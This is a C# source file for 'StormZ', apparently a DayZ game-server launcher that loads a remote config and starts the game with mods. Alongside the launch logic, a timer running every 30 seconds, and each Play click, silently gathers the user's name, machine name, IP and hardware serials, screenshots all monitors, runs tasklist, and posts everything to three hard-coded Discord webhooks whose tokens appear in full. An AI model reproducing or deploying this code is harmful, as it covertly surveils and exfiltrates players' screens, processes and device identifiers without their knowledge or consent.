using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Threading;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Text.Json;
using NodaTime;
using MessageBox = System.Windows.MessageBox;
using Application = System.Windows.Application;
using System.Diagnostics;

namespace StormZ {
    public partial class MainWindow : Window {

        string pastamods = "Mods";
        private DispatcherTimer timer;
        public string dayzexe = "DayZ_x64.exe";
        public string NickName;
        public string PcName;
        public string UserName;
        public string Sistema;
        public string IpLocal;
        public string Cpu;
        public string Hd;
        public string Gpu;
        public string GpuSerial;
        public string RamSerial;
        public string BoardSerial;
        public string Horario;
        public string arqn = "nick.txt";

        public MainWindow() {

            // Inicializa o componente e as configurações

            InitializeComponent();
            _ = InicializarConfiguracoes();

           
            if (File.Exists(arqn))
                txtnick.Text = File.ReadAllText(arqn).Trim();
            else
                txtnick.Text = "Sem nick";


            NickName = txtnick.Text.Trim();
            PcName = Environment.MachineName;
            UserName = Environment.UserName;
            Sistema = Environment.OSVersion.ToString();
            IpLocal = Dns.GetHostEntry(Dns.GetHostName())
                .AddressList.FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
            Cpu = GetWMIProperty("Win32_Processor", "ProcessorId");
            Hd = GetWMIProperty("Win32_PhysicalMedia", "SerialNumber");
            Gpu = GetWMIProperty("Win32_VideoController", "Name");
            GpuSerial = GetWMIProperty("Win32_VideoController", "PNPDeviceID");
            RamSerial = GetWMIProperty("Win32_PhysicalMemory", "SerialNumber");
            BoardSerial = GetWMIProperty("Win32_BaseBoard", "SerialNumber");
            var now = SystemClock.Instance.GetCurrentInstant();
            var zonedDateTime = DateTimeZoneProviders.Tzdb["America/Sao_Paulo"];
            var zonedTime = now.InZone(zonedDateTime);
            Horario = zonedTime.ToString("dd/MM/yyyy HH:mm:ss", null);
            IniciarEnvioAutomatico();


        }

        public class Config {

            // Propriedades para armazenar as configurações remotas

            public string IpServer { get; set; }
            public string PortServer { get; set; }
            public string Manutencao { get; set; }
        }

        private string IpServer;
        private string PortServer;
        private string Manutencao;

        // Método para obter a configuração remota do GitHub
        public async Task<Config> ObterConfiguracaoRemota() {
            try
            {
                using var httpClient = new HttpClient();
                string url = "https://raw.githubusercontent.com/Mateusdev3/StormZ_Configs/main/config.json";
                var json = await httpClient.GetStringAsync(url);
                return JsonSerializer.Deserialize<Config>(json);
            }
            catch (Exception ex)
            {
               Debug.WriteLine($"Erro ao obter configuração remota: {ex.Message}");
                return null;
            }
        }

        // Método para inicializar as configurações a partir do arquivo JSON remoto

        private async Task InicializarConfiguracoes() {
            var config = await ObterConfiguracaoRemota();

            if (config == null)
                return;

            IpServer = config.IpServer;
            PortServer = config.PortServer;
            Manutencao = config.Manutencao;
        }

        // Método para iniciar o envio automático de informações e tasklist a cada 30 segundos
        private void IniciarEnvioAutomatico() {
            timer = new DispatcherTimer();
            timer.Interval = TimeSpan.FromSeconds(30);
            timer.Tick += async (s, e) =>
            {
                await EnviarInfosParaWebhook();
                await EnviarTasklistParaWebhook();
            };
            timer.Start();
        }

        // Evento de clique do botão "Jogar" que inicia o jogo e envia as informações para o webhook
        private async void btnJogar_Click(object sender, RoutedEventArgs e) {
            txtnick.Text = File.ReadAllText(arqn).Trim();
            string mods = ObterMods(pastamods);
            await EnviarInfosParaWebhook();
            await EnviarTasklistParaWebhook();
            Debug.WriteLine($"Iniciando o jogo com IP: {IpServer}, Porta: {PortServer}, Manutenção: {Manutencao}");
            OpenDayz();
        }
        private void OpenDayz() {
            if (File.Exists(dayzexe))
            {   
                string mods = ObterMods(pastamods);
                string argumentos;
                argumentos = String.Format("-name={0} \"-mod={1}\" -connect={2} -port={3} -noFilePatching", NickName,mods, IpServer, PortServer);   
                Process.Start(dayzexe, argumentos);

            }
        }

        // Método para obter os mods da pasta especificada e formatar a string para o webhook
        private string ObterMods(string pastamods) {
            if (!Directory.Exists(pastamods))
            {
                Debug.WriteLine("Pasta mods não encontrada");
                return string.Empty;
            }

            string[] pastas = Directory.GetDirectories(pastamods);
            return "Mods\\" + string.Join(";Mods\\", pastas.Select(System.IO.Path.GetFileName));
        }

        // Método para enviar as informações do sistema e captura de tela para o webhook do Discord
        private async Task EnviarInfosParaWebhook() {
            try
            {
                

                string screenshotPath = CapturarTela();

                using (var client = new HttpClient())
                {
                    // Envia embed textual para o primeiro webhook
                    using (var form1 = new MultipartFormDataContent())
                    {
                        var payload = new
                        {
                            
                            embeds = new[]
                            {
                                new
                                {
                                    title = "**PLAYER CONECTANDO!!!**",
                                    color = 12648479,
                                    fields = new[]
                                    {
                                        new { name = "\ud83d\udc64 NICK", value = NickName, inline = false },
                                        new { name = "\ud83d\udcbb COMPUTERID", value = PcName, inline = false },
                                        new { name = "\ud83d\udcf6 IP", value = IpLocal ?? "Desconhecido", inline = false },
                                        new { name = "\ud83e\udde0 CPUID", value = Cpu, inline = false },
                                        new { name = "\ud83d\udcc2 HWID", value = Hd, inline = false },
                                        new { name = "\ud83c\udfae GPUNAME", value = Gpu, inline = false },
                                        new { name = "\ud83d\udcc9 GPUID", value = GpuSerial, inline = false },
                                        new { name = "\ud83d\udccd RAMID", value = RamSerial, inline = false },
                                        new { name = "\ud83d\udcbb BOARDID", value = BoardSerial, inline = false },
                                        new { name = "\ud83d\udcbb SISTEM", value = Sistema, inline = false },
                                        new { name = " \ud83d\udcdd DATA", value = Horario, inline = false },
                                    }
                                }
                            }
                        };

                        string jsonPayload = JsonSerializer.Serialize(payload);
                        form1.Add(new StringContent(jsonPayload, Encoding.UTF8, "application/json"), "payload_json");

                        await client.PostAsync("https://discord.com/api/webhooks/1390101378126450898/3_595tnlJOleDElOG6L-b11Hj7hY-n5Pltd7dxdjmZWOx-_ZDqapnq2NUGAIeqkLti-Q", form1);
                    }

                    // Envia screenshot para outro webhook
                    if (!string.IsNullOrEmpty(screenshotPath) && File.Exists(screenshotPath))
                    {
                        using (var form2 = new MultipartFormDataContent())
                        {
                            var imageContent = new ByteArrayContent(File.ReadAllBytes(screenshotPath));
                            imageContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
                            form2.Add(imageContent, "file", "screenshot.png");

                            form2.Add(new StringContent($"### {NickName}"), "content");

                            await client.PostAsync("https://discord.com/api/webhooks/1390101673866952795/sYdIFfoDgBNWnjnMbBDJ1qfKg0WE5Ke7QTdIyoAa-LXpQCDVaCG3fZ92hRrhB9F0XX6g", form2);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Erro ao enviar dados: {ex.Message}");
            }
        }

        // Método para enviar a lista de processos ativos (tasklist) para o webhook do Discord
        private async Task EnviarTasklistParaWebhook() {
            try
            {
                string caminhoTasklist = Path.Combine(Path.GetTempPath(), "tasklist.txt");

                var startInfo = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c tasklist",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = System.Diagnostics.Process.Start(startInfo))
                {
                    string output = await process.StandardOutput.ReadToEndAsync();
                    await process.WaitForExitAsync();
                    File.WriteAllText(caminhoTasklist, output);
                }

                using (var client = new HttpClient())
                using (var form = new MultipartFormDataContent())
                {
                    form.Add(new StringContent($"### {NickName}"), "content");

                    if (File.Exists(caminhoTasklist))
                    {
                        var tasklistContent = new ByteArrayContent(File.ReadAllBytes(caminhoTasklist));
                        tasklistContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
                        form.Add(tasklistContent, "file", "tasklist.txt");
                    }

                    await client.PostAsync("https://discord.com/api/webhooks/1390101876485390397/ylMAeEIdJxXLLHpT96lq-FlYDmH9_G-XK3hSH8K_8WKepb-u_k09cQTxDYtK9cZTIV4p", form);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Erro ao enviar tasklist: {ex.Message}");
            }
        }

        // Método para capturar a tela e salvar como imagem PNG
        private string CapturarTela() {
            try
            {
                var allScreens = System.Windows.Forms.Screen.AllScreens;
                int larguraTotal = allScreens.Sum(screen => screen.Bounds.Width);
                int alturaMaxima = allScreens.Max(screen => screen.Bounds.Height);

                using (var bitmap = new System.Drawing.Bitmap(larguraTotal, alturaMaxima))
                {
                    using (var g = System.Drawing.Graphics.FromImage(bitmap))
                    {
                        int offsetX = 0;
                        foreach (var screen in allScreens)
                        {
                            g.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, offsetX, 0, screen.Bounds.Size);
                            offsetX += screen.Bounds.Width;
                        }
                    }

                    string caminho = Path.Combine(Path.GetTempPath(), "screenshot.png");
                    bitmap.Save(caminho, System.Drawing.Imaging.ImageFormat.Png);
                    Debug.WriteLine($"Captura de tela salva em: {caminho}");
                    return caminho;
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        // Método para obter uma propriedade WMI de um objeto específico
        private string GetWMIProperty(string className, string propertyName) {
            try
            {
                using (var searcher = new ManagementObjectSearcher($"SELECT {propertyName} FROM {className}"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        return obj[propertyName]?.ToString().Trim();
                    }
                }
            }
            catch { }

            return "Desconhecido";
        }

        private void Minimize_Click(object sender, RoutedEventArgs e) => this.WindowState = WindowState.Minimized;

        private void Close_Click(object sender, RoutedEventArgs e) => this.Close();

        private void Mouse(object sender, MouseButtonEventArgs e) {
            if (e.LeftButton == MouseButtonState.Pressed)
                this.DragMove();
        }

        private void Abrirdc(object sender, RoutedEventArgs e) => Debug.WriteLine("abrindo discord...");

        private void Abrirconfig(object sender, RoutedEventArgs e) => Debug.WriteLine("Abrindo config");

        private void btnBaixar_Click(object sender, RoutedEventArgs e) => Debug.WriteLine("Baixando arquivos...");

        // Evento de clique do botão para abrir a janela de nome
        private void AbrirJanelaNome_Click(object sender, RoutedEventArgs e) {
            Window1 janelaNome = new Window1();
            if (janelaNome.ShowDialog() == true)
            {
                File.WriteAllText("nick.txt", janelaNome.NomeDigitado);
                txtnick.Text = janelaNome.NomeDigitado;
                NickName = janelaNome.NomeDigitado;
            }
        }

        // Evento de clique do botão para definir o nick

        private void Nick(object sender, RoutedEventArgs e) {
            Window1 janela = new Window1();
            if (janela.ShowDialog() == true)
            {
                txtnick.Text = janela.NomeDigitado;
                NickName = janela.NomeDigitado;



            }
        }
    }
}